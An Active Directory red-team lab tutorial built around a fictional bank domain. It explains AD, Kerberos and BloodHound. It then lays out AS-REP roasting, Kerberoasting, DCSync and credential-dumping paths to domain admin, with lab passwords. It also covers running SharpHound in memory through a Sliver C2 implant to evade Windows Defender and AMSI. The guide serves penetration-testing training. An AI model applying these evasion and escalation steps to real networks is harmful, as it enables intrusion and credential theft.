# DOMAIN ENUMERATION WITH BLOODHOUND
## The Complete Zero-Knowledge Guide for ORSUBANK Lab

> **"To make an apple pie from scratch, you must first invent the universe."**
> — Carl Sagan
>
> To understand BloodHound, you must first understand:
> - What is a network?
> - What is a directory?
> - What is Active Directory?
> - Why do companies use it?
> - What is LDAP?
> - How do attackers think about AD?
>
> **This guide starts from ABSOLUTE ZERO and builds up.**
> **Every single concept explained with practical examples.**

---

# YOUR LAB SETUP

| Computer | IP Address | Role | Primary User |
|----------|------------|------|--------------|
| DC01 | 192.168.100.10 | Domain Controller | Administrator |
| WS01 | 192.168.100.20 | Workstation 1 | vamsi.krishna |
| WS02 | 192.168.100.30 | Workstation 2 | ravi.teja |
| Kali | 192.168.100.100 | Attacker Machine | kali |

**Domain:** orsubank.local

---

# TABLE OF CONTENTS

## PART 1: UNDERSTANDING NETWORKS (From Zero)
- [1.1 What is a Network?](#part-11-what-is-a-network)
- [1.2 Why Do We Need User Accounts?](#part-12-why-do-we-need-user-accounts)
- [1.3 What is a Directory?](#part-13-what-is-a-directory)
- [1.4 What is Active Directory?](#part-14-what-is-active-directory)
- [1.5 The Domain Controller](#part-15-the-domain-controller)

## PART 2: UNDERSTANDING AD OBJECTS
- [2.1 Users, Groups, and Computers](#part-21-users-groups-and-computers)
- [2.2 Organizational Units (OUs)](#part-22-organizational-units-ous)
- [2.3 Group Memberships and Nesting](#part-23-group-memberships-and-nesting)
- [2.4 Permissions and ACLs](#part-24-permissions-and-acls)

## PART 3: HOW AD COMMUNICATES
- [3.1 What is LDAP?](#part-31-what-is-ldap)
- [3.2 What is Kerberos?](#part-32-what-is-kerberos)
- [3.3 How Authentication Works](#part-33-how-authentication-works)

## PART 4: THE ATTACKER'S PERSPECTIVE
- [4.1 Why Attackers Care About AD](#part-41-why-attackers-care-about-ad)
- [4.2 What is Enumeration?](#part-42-what-is-enumeration)
- [4.3 Attack Paths Explained](#part-43-attack-paths-explained)

## PART 5: BLOODHOUND FUNDAMENTALS
- [5.1 What is BloodHound?](#part-51-what-is-bloodhound)
- [5.2 How BloodHound Works](#part-52-how-bloodhound-works)
- [5.3 SharpHound - The Data Collector](#part-53-sharphound---the-data-collector)

## PART 6: PRACTICAL EXECUTION IN ORSUBANK LAB
- [6.1 Prerequisites (What You Need)](#part-61-prerequisites-what-you-need)
- [6.2 Running SharpHound from WS01](#part-62-running-sharphound-from-ws01)
- [6.3 Exfiltrating Data to Kali](#part-63-exfiltrating-data-to-kali)
- [6.4 Setting Up BloodHound on Kali](#part-64-setting-up-bloodhound-on-kali)
- [6.5 Importing Data](#part-65-importing-data)

## PART 7: FINDING ATTACK PATHS IN ORSUBANK
- [7.1 Finding Domain Admins](#part-71-finding-domain-admins)
- [7.2 The Nested Group Attack Path](#part-72-the-nested-group-attack-path)
- [7.3 Kerberoastable Accounts](#part-73-kerberoastable-accounts)
- [7.4 AS-REP Roastable Accounts](#part-74-as-rep-roastable-accounts)
- [7.5 Session Hunting](#part-75-session-hunting)
- [7.6 DCSync Attack Path](#part-76-dcsync-attack-path)

## PART 8: ADVANCED QUERIES
- [8.1 Custom Cypher Queries](#part-81-custom-cypher-queries)
- [8.2 Finding Shortest Paths](#part-82-finding-shortest-paths)
- [8.3 Finding All Paths to DA](#part-83-finding-all-paths-to-da)

## PART 9: INTERVIEW QUESTIONS & REFERENCE
- [9.1 Interview Questions](#part-91-interview-questions)
- [9.2 Troubleshooting](#part-92-troubleshooting)
- [9.3 What's Next](#part-93-whats-next)

---

# PART 1: UNDERSTANDING NETWORKS (From Zero)

---

## Part 1.1: What is a Network?

**Before we talk about AD or BloodHound, we need to understand what a network is.**

### Computers Alone Are Isolated

```
IMAGINE A SINGLE COMPUTER:
────────────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────────┐
│                                                              │
│   YOUR COMPUTER                                              │
│                                                              │
│   - Your files                                               │
│   - Your programs                                            │
│   - Your user account                                        │
│                                                              │
│   Everything is LOCAL to this one machine.                   │
│                                                              │
└─────────────────────────────────────────────────────────────┘

Problem: What if you want to share a file with a colleague?
         You'd have to copy it to a USB drive and walk it over!
```

### A Network Connects Computers

```
A NETWORK IS SIMPLY CONNECTED COMPUTERS:
────────────────────────────────────────────────────────────────

┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│             │    │             │    │             │
│  WS01       │────│  WS02       │────│  DC01       │
│ (vamsi)     │    │ (ravi.teja) │    │ (Server)    │
│             │    │             │    │             │
└─────────────┘    └─────────────┘    └─────────────┘
       │                  │                  │
       └──────────────────┼──────────────────┘
                          │
                    192.168.100.0/24
                   (ORSUBANK NETWORK)

NOW:
- vamsi can share files with ravi.teja without USB drives
- They can use the same printer
- They can access the same file server
- They can authenticate to the same domain!
```

### ORSUBANK Network

```
THE ORSUBANK LAB NETWORK:
────────────────────────────────────────────────────────────────

                          INTERNET
                             │
                      ┌──────┴──────┐
                      │   FIREWALL  │
                      │  (Security) │
                      └──────┬──────┘
                             │
    ┌────────────────────────┼────────────────────────┐
    │                        │                        │
    │        ORSUBANK INTERNAL NETWORK                │
    │           192.168.100.0/24                      │
    │                                                 │
    │  ┌──────────────┐                               │
    │  │     DC01     │ ← Domain Controller           │
    │  │  .100.10     │   (The Boss of the network)   │
    │  └──────────────┘                               │
    │                                                 │
    │  ┌──────────────┐  ┌──────────────┐            │
    │  │     WS01     │  │     WS02     │            │
    │  │  .100.20     │  │  .100.30     │            │
    │  │ vamsi.krishna│  │ ravi.teja    │            │
    │  └──────────────┘  └──────────────┘            │
    │                                                 │
    └─────────────────────────────────────────────────┘
                             │
                    ┌────────┴────────┐
                    │      KALI       │
                    │   .100.100      │ ← YOU (Attacker)
                    │                 │
                    └─────────────────┘
```

---

## Part 1.2: Why Do We Need User Accounts?

### The Problem: Who's Allowed to Do What?

```
THE PROBLEM WITH JUST CONNECTING COMPUTERS:
────────────────────────────────────────────────────────────────

If everyone is just connected... who controls what?

BAD SCENARIO AT ORSUBANK:
- Random person walks in
- Sits at WS01
- Can access EVERYTHING?
- Customer bank accounts? YES
- Employee salaries? YES
- Internal security systems? YES

That's a disaster for a bank! We need CONTROL.
```

### User Accounts Control Access

```
USER ACCOUNTS SOLVE THIS:
────────────────────────────────────────────────────────────────

EACH PERSON gets a USER ACCOUNT:
- Username: vamsi.krishna
- Password: (secret)

EACH RESOURCE has PERMISSIONS:
- Customer Data: Only Loan Officers can access
- Salary Records: Only HR and Finance can access
- IT Systems: Only IT Department can access

NOW:
- When you log in, the computer knows WHO you are
- Based on who you are, it knows WHAT you can access
- Random person can't just walk in and access everything
```

---

## Part 1.3: What is a Directory?

### A Directory is a Phone Book for Your Network

```
A NETWORK DIRECTORY:
────────────────────────────────────────────────────────────────

Instead of phone numbers, it stores NETWORK information:

┌─────────────────────────────────────────────────────────────┐
│                 ORSUBANK NETWORK DIRECTORY                   │
│                                                              │
│   USERS:                                                     │
│   ├── vamsi.krishna                                          │
│   │   ├── Password: (encrypted)                              │
│   │   ├── Email: vamsi@orsubank.local                        │
│   │   ├── Department: Management                             │
│   │   └── Groups: BankEmployees, Management                  │
│   │                                                          │
│   ├── ammulu.orsu                                            │
│   │   ├── Password: (encrypted)                              │
│   │   ├── Department: IT                                     │
│   │   └── Groups: Domain Admins, IT_Team ← POWERFUL!         │
│   │                                                          │
│   ├── lakshmi.devi                                           │
│   │   └── Groups: BankEmployees, IT_Team                     │
│   │                                                          │
│   COMPUTERS:                                                 │
│   ├── WS01                                                   │
│   │   ├── Operating System: Windows 11                       │
│   │   └── IP Address: 192.168.100.20                         │
│   │                                                          │
│   ├── WS02                                                   │
│   │   └── IP Address: 192.168.100.30                         │
│   │                                                          │
│   SERVICE ACCOUNTS:                                          │
│   ├── sqlservice                                             │
│   │   └── SPN: MSSQLSvc/DC01.orsubank.local:1433             │
│   ├── httpservice                                            │
│   ├── svc_backup                                             │
│   │   └── Groups: Domain Admins ← SERVICE ACCOUNT IS DA!     │
│   │                                                          │
└─────────────────────────────────────────────────────────────┘

ONE CENTRAL PLACE stores:
- All user accounts (10+ employees at ORSUBANK)
- All computer information (DC01, WS01, WS02)
- All groups and permissions
- All service accounts
```

---

## Part 1.4: What is Active Directory?

### Active Directory is Microsoft's Directory Service

```
ACTIVE DIRECTORY (AD) = MICROSOFT'S NETWORK DIRECTORY
────────────────────────────────────────────────────────────────

ORSUBANK uses Active Directory to manage everything:

✓ All user accounts (vamsi.krishna, ammulu.orsu, lakshmi.devi...)
✓ All computer accounts (DC01, WS01, WS02)
✓ All groups (Domain Admins, BankEmployees, IT_Team)
✓ Service accounts (sqlservice, httpservice, svc_backup)
✓ Permissions (who can access what)
✓ Policies (password rules, security settings)

ORSUBANK AD STRUCTURE:
──────────────────────

              ┌───────────────────────────────────────┐
              │                                       │
              │      DOMAIN: orsubank.local           │
              │                                       │
              └───────────────────┬───────────────────┘
                                  │
        ┌─────────────────────────┼─────────────────────────┐
        │                         │                         │
┌───────┴───────┐         ┌───────┴───────┐         ┌───────┴───────┐
│               │         │               │         │               │
│ OU: Bank      │         │ OU: Service   │         │ OU: Groups    │
│   Employees   │         │   Accounts    │         │               │
│               │         │               │         │               │
│ - vamsi       │         │ - sqlservice  │         │ - Domain      │
│ - ammulu      │         │ - httpservice │         │   Admins      │
│ - lakshmi     │         │ - iisservice  │         │ - IT_Team     │
│ - ravi.teja   │         │ - svc_backup  │         │ - HelpDesk    │
│ - pranavi     │         │               │         │ - Server_     │
│ - harsha      │         │               │         │   Admins      │
│ - kiran.kumar │         │               │         │               │
└───────────────┘         └───────────────┘         └───────────────┘
```

---

## Part 1.5: The Domain Controller

### The Domain Controller (DC) Runs Active Directory

```
DOMAIN CONTROLLER = THE SERVER RUNNING AD
────────────────────────────────────────────────────────────────

In ORSUBANK lab, DC01 (192.168.100.10) is the Domain Controller.

┌─────────────────────────────────────────────────────────────┐
│                                                              │
│   DC01 - DOMAIN CONTROLLER                                   │
│   IP: 192.168.100.10                                         │
│   OS: Windows Server 2025                                    │
│   ────────────────────────                                   │
│                                                              │
│   It runs:                                                   │
│   - Active Directory Domain Services (AD DS)                 │
│   - The AD database (ntds.dit)                               │
│   - LDAP service (port 389) - for queries                    │
│   - Kerberos service (port 88) - for authentication          │
│   - DNS service (port 53) - for name resolution              │
│                                                              │
│   ALL USER LOGINS GO THROUGH THIS SERVER!                    │
│                                                              │
│   NTDS.DIT contains:                                         │
│   - Every user's password hash                               │
│   - Every group membership                                   │
│   - Every secret in the domain                               │
│                                                              │
│   IF YOU COMPROMISE DC01, YOU OWN ORSUBANK!                  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### How Login Works in ORSUBANK

```
WHAT HAPPENS WHEN VAMSI LOGS INTO WS01:
────────────────────────────────────────────────────────────────

1. vamsi.krishna sits at WS01 (192.168.100.20)
2. He types: Username: vamsi.krishna
              Password: B@nkM@nager2024!

3. WS01 doesn't know if this is correct!
   WS01 asks DC01: "Hey, is vamsi.krishna / B@nkM@nager2024! valid?"

4. DC01 checks its database (ntds.dit):
   - Does vamsi.krishna exist? YES
   - Is the password correct? YES
   - Is the account enabled? YES
   - DC01 → WS01: "Yes, this user is legit!"

5. WS01 lets vamsi log in.


VISUALIZATION:
─────────────────

[VAMSI] ──login──► [WS01] ──"is this valid?"──► [DC01]
                       │       192.168.100.20→10    │
                       │                             │
                       │ ◄──"yes, valid!"────────────┘
                       │
                       └──► Welcome, vamsi.krishna!
```

---

# PART 2: UNDERSTANDING AD OBJECTS

---

## Part 2.1: Users, Groups, and Computers

### ORSUBANK User Objects

```
ORSUBANK HAS THESE USER ACCOUNTS:
────────────────────────────────────────────────────────────────

MANAGEMENT:
├── vamsi.krishna       │ Bank Manager
│   └── Groups: BankEmployees, Management
│
├── ammulu.orsu         │ IT Manager
│   └── Groups: Domain Admins, IT_Team  ← DOMAIN ADMIN!
│
IT DEPARTMENT:
├── lakshmi.devi        │ System Administrator  
│   └── Groups: IT_Team, BankEmployees
│
├── ravi.teja           │ Network Administrator
│   └── Groups: IT_Team, BankEmployees
│
BRANCH STAFF:
├── pranavi             │ Branch Manager
│   └── DoesNotRequirePreAuth: TRUE  ← AS-REP ROASTABLE!
│   └── Password: Branch123!
│
├── harsha.vardhan      │ Customer Service Manager
│   └── DoesNotRequirePreAuth: TRUE  ← AS-REP ROASTABLE!
│   └── Password: Customer2024!
│   └── Groups: HelpDesk_Team → IT_Support → Server_Admins → DA!
│
├── kiran.kumar         │ Financial Analyst
│   └── DoesNotRequirePreAuth: TRUE  ← AS-REP ROASTABLE!
│   └── Password: Finance1!
│
SERVICE ACCOUNTS:
├── sqlservice          │ SPN: MSSQLSvc/DC01:1433
│   └── Password: MYpassword123#  ← KERBEROASTABLE!
│
├── httpservice         │ SPN: HTTP/web.orsubank.local
│   └── Password: Summer2024!  ← KERBEROASTABLE!
│
├── iisservice          │ SPN: HTTP/app.orsubank.local
│   └── Password: P@ssw0rd  ← KERBEROASTABLE!
│
├── backupservice       │ SPN: MSSQLSvc/DC01:1434
│   └── Password: SQLAgent123!  ← KERBEROASTABLE!
│
└── svc_backup          │ SPN: backup/dc01.orsubank.local
    └── Password: Backup@2024!
    └── Groups: Domain Admins  ← SERVICE ACCOUNT IS DA!
```

### Computer Objects

```
ORSUBANK COMPUTER ACCOUNTS:
────────────────────────────────────────────────────────────────

DC01$                           ← Domain Controller
├── dNSHostName: DC01.orsubank.local
├── operatingSystem: Windows Server 2025
├── IP: 192.168.100.10
└── Role: Holds all AD data, authentication hub

WS01$                           ← Workstation 1
├── dNSHostName: WS01.orsubank.local
├── operatingSystem: Windows 11 Pro
├── IP: 192.168.100.20
├── Primary User: vamsi.krishna
└── SPECIAL: Has DCSync rights! ← VULNERABILITY!

WS02$                           ← Workstation 2
├── dNSHostName: WS02.orsubank.local
├── operatingSystem: Windows 11 Pro
├── IP: 192.168.100.30
└── Primary User: ravi.teja
```

---

## Part 2.2: Organizational Units (OUs)

```
ORSUBANK OU STRUCTURE:
────────────────────────────────────────────────────────────────

DOMAIN: orsubank.local
│
├── OU=BankEmployees              ← All regular employees
│   ├── CN=vamsi.krishna
│   ├── CN=ammulu.orsu
│   ├── CN=lakshmi.devi
│   ├── CN=ravi.teja
│   ├── CN=pranavi
│   ├── CN=harsha.vardhan
│   ├── CN=kiran.kumar
│   ├── CN=divya
│   └── CN=madhavi
│
├── OU=ServiceAccounts            ← Service accounts
│   ├── CN=sqlservice
│   ├── CN=httpservice
│   ├── CN=iisservice
│   └── CN=backupservice
│
├── CN=Users                      ← Default container
│   └── CN=svc_backup            ← The DA service account!
│
└── CN=Computers                  ← Domain computers
    ├── CN=WS01
    └── CN=WS02
```

---

## Part 2.3: Group Memberships and Nesting

### THE HIDDEN ATTACK PATH IN ORSUBANK

```
ORSUBANK HAS A DANGEROUS NESTED GROUP CHAIN:
────────────────────────────────────────────────────────────────

THE ATTACK PATH YOU'LL FIND WITH BLOODHOUND:

                      ┌─────────────────┐
                      │  Domain Admins  │  ← Ultimate goal!
                      │                 │
                      │ Direct Members: │
                      │ - ammulu.orsu   │
                      │ - svc_backup    │
                      │ - Server_Admins │ ←── Nested group!
                      └────────┬────────┘
                               │
                               │ (is member of)
                               │
                      ┌────────┴────────┐
                      │  Server_Admins  │
                      │                 │
                      │ Members:        │
                      │ - IT_Support    │ ←── Another nested group!
                      └────────┬────────┘
                               │
                               │ (is member of)
                               │
                      ┌────────┴────────┐
                      │   IT_Support    │
                      │                 │
                      │ Members:        │
                      │ - HelpDesk_Team │ ←── Yet another!
                      └────────┬────────┘
                               │
                               │ (is member of)
                               │
                      ┌────────┴────────┐
                      │ HelpDesk_Team   │
                      │                 │
                      │ Members:        │
                      │ - harsha.vardhan│ ← REGULAR USER!
                      └─────────────────┘


THE RESULT:
───────────
harsha.vardhan appears to be a regular "Customer Service Manager"
but through GROUP NESTING, he is EFFECTIVELY A DOMAIN ADMIN!

harsha.vardhan → HelpDesk_Team → IT_Support → Server_Admins → Domain Admins

BloodHound will show you this path automatically!
```

### Why This Matters

```
ATTACKER'S VIEW:
────────────────────────────────────────────────────────────────

1. You AS-REP Roast harsha.vardhan (no pre-auth required)
2. You crack his password: Customer2024!
3. You now have Domain Admin through nested groups!

Without BloodHound, you'd never know harsha.vardhan was DA!
His account looks completely normal:
- Title: Customer Service Manager
- Department: Customer Service
- Not directly in Domain Admins

BloodHound reveals hidden paths like this!
```

---

## Part 2.4: Permissions and ACLs

### The DCSync Vulnerability on WS01

```
ORSUBANK HAS A DANGEROUS MISCONFIGURATION:
────────────────────────────────────────────────────────────────

WS01$ (the computer account for Workstation 1) has been given
REPLICATION RIGHTS on the domain!

This means: If you get SYSTEM on WS01, you can DCSync!

WHAT IS DCSYNC?
───────────────
DCSync = Pretending to be a Domain Controller
         and asking for password hashes

Normal: Only DC01 has replication rights
Vuln:   WS01$ also has replication rights (misconfiguration!)


THE ATTACK PATH:
────────────────

1. You compromise WS01 (where vamsi.krishna logs in)
2. You escalate to SYSTEM on WS01
3. Using WS01$'s computer account, you DCSync
4. You get the hash for Administrator
5. You own the domain!

[WS01 SYSTEM] ──DCSync──► [DC01] ──"Here are all hashes"──► [Attacker]
```

---

# PART 3: HOW AD COMMUNICATES

---

## Part 3.1: What is LDAP?

```
LDAP = LIGHTWEIGHT DIRECTORY ACCESS PROTOCOL
────────────────────────────────────────────────────────────────

LDAP is how programs TALK to Active Directory.

When you run BloodHound/SharpHound, it uses LDAP to ask:
- "Give me all users"
- "Give me all groups"
- "What groups is harsha.vardhan in?"
- "What permissions does WS01$ have?"


LDAP QUERY EXAMPLE:
───────────────────

Q: "Give me all users who don't require pre-authentication"
   (Filter: userAccountControl:1.2.840.113556.1.4.803:=4194304)

A: pranavi, harsha.vardhan, kiran.kumar
   ↑ These are AS-REP Roastable!


LDAP runs on:
- Port 389 (unencrypted)
- Port 636 (encrypted/LDAPS)

In ORSUBANK:
- DC01:389 is the LDAP server
- All queries go through DC01
```

---

## Part 3.2: What is Kerberos?

```
KERBEROS = THE AUTHENTICATION PROTOCOL
────────────────────────────────────────────────────────────────

Instead of sending passwords over the network, Windows uses
TICKETS to prove identity. This is Kerberos.

HOW IT WORKS (Simplified):
──────────────────────────

1. vamsi.krishna wants to access a file server
2. Instead of sending password, vamsi asks DC01 for a TICKET
3. DC01 gives vamsi a ticket (encrypted with vamsi's password hash)
4. vamsi presents the ticket to the file server
5. File server trusts DC01, so it accepts the ticket


WHY THIS MATTERS FOR ATTACKS:
─────────────────────────────

KERBEROASTING:
- Service accounts have SPNs (Service Principal Names)
- Anyone can request a ticket for a service
- The ticket is encrypted with the service's password
- You can crack the ticket offline to get the password!

ORSUBANK vulnerable accounts:
- sqlservice (SPN: MSSQLSvc/DC01:1433)
- httpservice (SPN: HTTP/web.orsubank.local)
- iisservice (SPN: HTTP/app.orsubank.local)
- backupservice (SPN: MSSQLSvc/DC01:1434)
- svc_backup (SPN: backup/dc01.orsubank.local) ← This one is DA!


AS-REP ROASTING:
- Normally, you must prove your password before getting a ticket
- Some accounts have "Do not require Kerberos pre-authentication"
- For those, you can get an encrypted response without knowing password
- Crack it offline!

ORSUBANK vulnerable accounts:
- pranavi (password: Branch123!)
- harsha.vardhan (password: Customer2024!)
- kiran.kumar (password: Finance1!)
```

---

## Part 3.3: How Authentication Works

```
AUTHENTICATION FLOW IN ORSUBANK:
────────────────────────────────────────────────────────────────

SCENARIO: vamsi.krishna logs into WS01

STEP 1: vamsi types credentials at WS01
        Username: vamsi.krishna
        Password: B@nkM@nager2024!

STEP 2: WS01 sends AS-REQ to DC01
        "I'm vamsi.krishna, give me a ticket"

STEP 3: DC01 checks if vamsi exists and password is correct
        If yes → sends back AS-REP (contains TGT)

STEP 4: vamsi now has a Ticket-Granting Ticket (TGT)
        This is his "proof of identity" for the next 10 hours

STEP 5: When vamsi wants to access something:
        - He asks DC01 for a Service Ticket (TGS-REQ)
        - DC01 gives him a ticket for that service
        - He presents the ticket to the service


         vamsi.krishna                DC01                 File Server
              │                         │                       │
              │ ──AS-REQ───────────────►│                       │
              │ (username + timestamp)   │                       │
              │                         │                       │
              │ ◄──AS-REP───────────────│                       │
              │ (TGT - encrypted)       │                       │
              │                         │                       │
              │ ──TGS-REQ──────────────►│                       │
              │ (I want file server)    │                       │
              │                         │                       │
              │ ◄──TGS-REP──────────────│                       │
              │ (Service ticket)        │                       │
              │                         │                       │
              │ ──────Service Ticket────────────────────────────►│
              │                                                  │
              │ ◄──────Access Granted────────────────────────────│
              │                                                  │
```

---

# PART 4: THE ATTACKER'S PERSPECTIVE

---

## Part 4.1: Why Attackers Care About AD

```
ACTIVE DIRECTORY IS THE GOLDEN TARGET:
────────────────────────────────────────────────────────────────

In ORSUBANK:

IF YOU GET DOMAIN ADMIN:
├── You control all 10+ user accounts
├── You control all computers (DC01, WS01, WS02)
├── You can access all files
├── You can read all emails
├── You can access customer banking data
├── You can create backdoors
├── You can steal credentials
└── You own the entire bank's IT infrastructure!


THE DOMAIN ADMIN GOAL:
──────────────────────

START:  You are vamsi.krishna
        Regular "Bank Manager"
        Can only access what a bank manager should access

GOAL:   Become Domain Admin
        ammulu.orsu, svc_backup, or effectively through groups

HOW:    Find ATTACK PATHS using BloodHound!
```

---

## Part 4.2: What is Enumeration?

```
ENUMERATION = GATHERING INFORMATION
────────────────────────────────────────────────────────────────

Before attacking, we need to understand what exists:

QUESTIONS WE WANT ANSWERED:
───────────────────────────

1. WHO are the Domain Admins?
   → ammulu.orsu (directly)
   → svc_backup (directly)
   → harsha.vardhan (through nested groups)

2. WHO has "Do not require preauth"?
   → pranavi, harsha.vardhan, kiran.kumar
   → These can be AS-REP Roasted!

3. WHAT service accounts have SPNs?
   → sqlservice, httpservice, iisservice, backupservice, svc_backup
   → These can be Kerberoasted!

4. WHO is logged into which computer?
   → vamsi.krishna on WS01
   → lakshmi.devi (DA) sometimes on WS01 ← Session to steal!

5. WHAT computers have special permissions?
   → WS01$ has DCSync rights!

6. WHAT path can I take from my current user to DA?
   → THIS IS WHAT BLOODHOUND ANSWERS!
```

---

## Part 4.3: Attack Paths Explained

```
ATTACK PATHS IN ORSUBANK:
────────────────────────────────────────────────────────────────

PATH 1: AS-REP ROAST → NESTED GROUPS → DA
─────────────────────────────────────────

1. Get harsha.vardhan's AS-REP hash (no auth required!)
2. Crack it: Customer2024!
3. Login as harsha.vardhan
4. harsha is in HelpDesk_Team → IT_Support → Server_Admins → DA!
5. You ARE Domain Admin!


PATH 2: KERBEROAST svc_backup → DA
──────────────────────────────────

1. Request TGS ticket for svc_backup's SPN
2. Crack it: Backup@2024!
3. Login as svc_backup
4. svc_backup is directly in Domain Admins!
5. You ARE Domain Admin!


PATH 3: COMPROMISE WS01 → DCSYNC → DA
─────────────────────────────────────

1. Get shell on WS01 (via vamsi.krishna)
2. Escalate to SYSTEM
3. Use WS01$'s replication rights to DCSync
4. Get Administrator's NTLM hash
5. Pass-the-hash as Administrator
6. You ARE Domain Admin!


PATH 4: SESSION HUNTING → CREDENTIAL THEFT → DA
───────────────────────────────────────────────

1. Get shell on WS01 (via vamsi.krishna)
2. Wait for lakshmi.devi (DA) to log in
3. Dump her credentials from memory
4. Use her credentials
5. You ARE Domain Admin!


BloodHound will SHOW YOU all these paths visually!
```

---

# PART 5: BLOODHOUND FUNDAMENTALS

---

## Part 5.1: What is BloodHound?

```
BLOODHOUND = AD ATTACK PATH VISUALIZER
────────────────────────────────────────────────────────────────

BloodHound is a tool that:
1. Collects AD data (using SharpHound)
2. Stores it in a graph database (Neo4j)
3. Visualizes relationships and attack paths

INSTEAD OF:
──────────
Manually checking every user, group, permission...
"Is harsha.vardhan in any groups?"
"What groups are those groups in?"
"Do any of those lead to DA?"
... (This would take HOURS)

WITH BLOODHOUND:
────────────────
Click "Shortest Paths to Domain Admins from Owned Principals"
→ See VISUAL PATH: harsha.vardhan → HelpDesk → IT_Support → Server_Admins → DA

In seconds, not hours!


WHY IT'S CALLED BLOODHOUND:
───────────────────────────
Like a bloodhound dog tracking a scent...
BloodHound tracks the "scent" of privilege through AD!
```

---

## Part 5.2: How BloodHound Works

```
THE BLOODHOUND WORKFLOW:
────────────────────────────────────────────────────────────────

STEP 1: RUN SHARPHOUND (Data Collection)
────────────────────────────────────────
On compromised machine (WS01 in our lab):
> SharpHound.exe -c All

This queries AD via LDAP and collects:
- All users
- All groups
- All computers
- Group memberships
- Sessions (who's logged in where)
- ACLs (permissions)


STEP 2: EXFILTRATE THE DATA
───────────────────────────
SharpHound creates a ZIP file:
> 20241229_BloodHound.zip

Transfer this to your Kali machine.


STEP 3: IMPORT INTO BLOODHOUND
──────────────────────────────
BloodHound (on Kali) reads the ZIP and populates Neo4j.

Now all the data is in a graph database!


STEP 4: QUERY FOR ATTACK PATHS
──────────────────────────────
Click pre-built queries or write custom ones:
- "Find all Domain Admins"
- "Shortest Paths to Domain Admins"
- "Kerberoastable Accounts"
- "AS-REP Roastable Users"
- "Users with DCSync Rights"
```

---

## Part 5.3: SharpHound - The Data Collector

```
SHARPHOUND OPTIONS:
────────────────────────────────────────────────────────────────

SharpHound.exe [options]

COLLECTION METHODS (-c):
────────────────────────
-c All          → Collect everything (recommended for first run)
-c Default      → Most common data (users, groups, sessions)
-c Group        → Only group memberships
-c Session      → Only active sessions
-c LoggedOn     → Who's logged on to computers
-c ACL          → Access control lists
-c ObjectProps  → Object properties

ORSUBANK EXAMPLE:
─────────────────
For complete enumeration:
> SharpHound.exe -c All

For just finding who's logged in where:
> SharpHound.exe -c Session


OUTPUT:
───────
SharpHound creates a ZIP file containing JSON files:
- computers.json
- users.json
- groups.json
- domains.json
- sessions.json
- ... etc

This ZIP is what you import into BloodHound!
```

---

# PART 6: PRACTICAL EXECUTION WITH SLIVER C2 (DEFENDER ENABLED!)

> **⚠️ CRITICAL: This section assumes Windows Defender is ENABLED.**
> We will use evasion techniques, NOT disable Defender.
> This is how real Red Teams operate!

---

## Part 6.1: Understanding The Challenge

```
THE PROBLEM WITH RUNNING SHARPHOUND:
────────────────────────────────────────────────────────────────

If you just run SharpHound.exe on a machine with Defender:

❌ Defender detects SharpHound.exe (known malware signature)
❌ Your session gets killed
❌ Alert sent to SOC
❌ You're burned

REAL RED TEAM APPROACH:
────────────────────────────────────────────────────────────────

✅ Use Sliver's execute-assembly (in-memory execution)
✅ AMSI is already bypassed by our loader
✅ Run from memory, no file on disk
✅ Use stealth collection methods
✅ Exfiltrate over encrypted C2 channel
✅ Clean up artifacts
```

---

## Part 6.2: Prerequisites - Your Sliver Session

```
WHAT YOU NEED:
────────────────────────────────────────────────────────────────

FROM THE INITIAL ACCESS WALKTHROUGH:
─────────────────────────────────────
You should have:

1. Sliver server running on Kali (192.168.100.100)
   $ sliver-server

2. HTTPS listener on port 443
   sliver > https --lhost 192.168.100.100 --lport 443

3. Active session from WS01
   sliver > sessions
   
   ID         Transport   Hostname   Username          OS
   ────────   ─────────   ────────   ────────────────  ────────
   abc123     https       WS01       ORSUBANK\vamsi.krishna   Windows

4. Interact with session
   sliver > use abc123
   sliver (IMPLANT_NAME) >

IF YOU DON'T HAVE THIS:
───────────────────────
Go back to 00_initial_access_sliver_setup.md and complete it first!
```

---

## Part 6.3: Setting Up SharpHound for Evasion

### Why execute-assembly is Stealthy

```
SLIVER'S EXECUTE-ASSEMBLY EXPLAINED:
────────────────────────────────────────────────────────────────

TRADITIONAL (DETECTED):
─────────────────────────
1. Upload SharpHound.exe to disk
2. File touches disk → Defender scans it → DETECTED!
3. Execute from disk → More signatures → DETECTED!

SLIVER EXECUTE-ASSEMBLY (STEALTH):
───────────────────────────────────
1. SharpHound.exe stays on YOUR Kali machine
2. Sliver sends it over encrypted C2 channel
3. Sliver loads it directly into memory
4. Executes from memory → No file on disk!
5. AMSI already bypassed by our loader → No runtime detection!
6. Output captured and sent back over C2

┌──────────────┐     encrypted C2     ┌──────────────┐
│    KALI      │ ◄───────────────────►│    WS01      │
│              │   SharpHound bytes   │              │
│ SharpHound.  │   (never touches     │ Loaded in    │
│ exe stays    │    disk on WS01)     │ memory only  │
│ here         │                      │              │
└──────────────┘                      └──────────────┘
```

### Download SharpHound on Kali (Not on Target!)

```bash
# On KALI (192.168.100.100) - NOT on WS01!

# Create tools directory
mkdir -p /opt/red-team-tools
cd /opt/red-team-tools

# Download SharpHound
wget https://github.com/BloodHoundAD/SharpHound/releases/download/v2.0.0/SharpHound-v2.0.0.zip
unzip SharpHound-v2.0.0.zip

# Verify
ls -la SharpHound.exe
# -rwxr-xr-x 1 kali kali 1234567 Dec 29 10:00 SharpHound.exe

# This file STAYS ON KALI
# We use execute-assembly to run it in-memory on WS01
```

---

## Part 6.4: Running SharpHound via Sliver (In-Memory)

### Step 6.4.1: Basic In-Memory Execution

```bash
# In Sliver console - interacting with WS01 session

sliver (IMPLANT_NAME) > execute-assembly /opt/red-team-tools/SharpHound.exe -c All

# What happens:
# 1. Sliver reads SharpHound.exe from your Kali disk
# 2. Sends bytes to implant over encrypted HTTPS
# 3. Implant loads .NET assembly in memory
# 4. Executes with arguments "-c All"
# 5. Output returned to you

# Expected output:
# ------------------------------------------------
# Initializing SharpHound at 10:30 AM on 12/29/2024
# ------------------------------------------------
# Resolved Collection Methods: Group, LocalAdmin, Session...
# [+] Creating Schema map for domain ORSUBANK.LOCAL
# Status: 0 objects finished (+0) -- Using 35 MB RAM
# [+] Enumeration complete! 45 objects in 00:00:05
# Compressing data to .\20241229103000_BloodHound.zip
```

### Step 6.4.2: Stealth Collection (Recommended)

```bash
# STEALTHIER APPROACH - Avoid noisy collection methods

sliver (IMPLANT_NAME) > execute-assembly /opt/red-team-tools/SharpHound.exe -c DCOnly

# -c DCOnly only queries the Domain Controller
# Much less network noise than -c All
